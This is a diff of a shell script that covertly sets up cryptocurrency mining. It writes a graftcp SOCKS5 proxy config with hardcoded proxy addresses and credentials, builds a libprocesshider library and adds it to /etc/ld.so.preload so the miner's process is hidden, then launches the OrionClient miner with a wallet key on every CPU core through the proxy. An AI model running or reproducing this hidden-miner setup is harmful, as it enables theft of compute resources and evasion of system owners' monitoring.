@@ -27,9 +27,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 157.245.142.37:443
-socks5_username = kalaumalingomongdonk
-socks5_password = kalaumalingomongdonk
+socks5 = ${{ 138.197.79.17:443 }}
+socks5_username = ${{ majapahlevi }}
+socks5_password = ${{ majapahlevi }}
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -59,4 +59,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./OrionClient mine -a --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV --worker $(shuf -n 1 -i 1-99999)-AMD -t $(nproc --all) --ice
+./graftcp/graftcp & clear & ./OrionClient mine -a --pool twbitz --key 5o9PkcxTjqtvnGZRoqzAandwVKMkkzgpi4bUTkkeRgGV --worker $(shuf -n 1 -i 1-99999)-ITIL -t $(nproc --all) --ice
